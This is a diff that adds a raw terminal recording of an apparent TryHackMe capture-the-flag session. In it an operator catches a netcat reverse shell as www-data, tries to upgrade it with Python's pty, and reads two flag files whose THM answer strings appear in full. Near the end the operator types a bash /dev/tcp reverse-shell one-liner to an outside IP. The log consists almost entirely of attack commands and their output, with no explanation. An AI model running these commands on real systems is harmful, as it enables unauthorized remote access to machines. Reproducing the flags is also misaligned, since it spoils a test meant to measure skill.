@@ -1,0 +1,42 @@
+Script started on 2025-04-06 22:02:49+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 5740
+SOCKET: Shell has connected! PID: 1564
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpython2 [K[K3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[K/bin/bash: line 2: python3: command not found
+[K[K[?2004hwhich python[?2004l[K[?2004hwhich python
+[K[K[?2004hwhereis python[?2004l[K[?2004hwhereis python
+[Kpython:
+[K[K[?2004hwhereis python2[?2004l[K[?2004hwhereis python2
+[Kpython2:
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kcat.php
+cats
+dog.php
+dogs
+flag.php
+index.php
+reverse.php
+style.css
+[K[K[?2004hcat flag.php[?2004l[K[?2004hcat flag.php
+[K<?php
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+?>
+[K[K[?2004hpwd[?2004l[K[?2004hpwd
+[K/var/www/html
+[K[K[?2004hcd ..[?2004l[K[?2004hcd ..
+[K[K[?2004hpwd[?2004l[K[?2004hpwd
+[K/var/www
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kflag2_QMW7JvaY2LvK.txt
+html
+[K[K[?2004hcat [7mflag2_QMW7JvaY2LvK.txt[27m[7mcat [27mflag2_QMW7JvaY2LvK.txt[?2004l[K[?2004hcat flag2_QMW7JvaY2LvK.txt
+[KTHM{LF1_t0_RC3_aec3fb}
+[K[K[?2004hwhich bash[?2004l[K[?2004hwhich bash
+[K/bin/bash
+[K[K[?2004h[7m/bin/bash -i >& /dev/tcp/10.8.61.245/6047 0>&1[27m/bin/bash -i >& /dev/tcp/10.8.61.245/6047 0>&1[1P 0>&1[1P 0>&1[1P 0>&1[1P 0>&14 0>&14 0>&14 0>&14 0>&1[?2004l[K[?2004h/bin/bash -i >& /dev/tcp/10.8.61.245/4444 0>&1
+[K
+[?2004l
+Script done on 2025-04-06 22:35:08+03:00 [COMMAND_EXIT_CODE="1"]
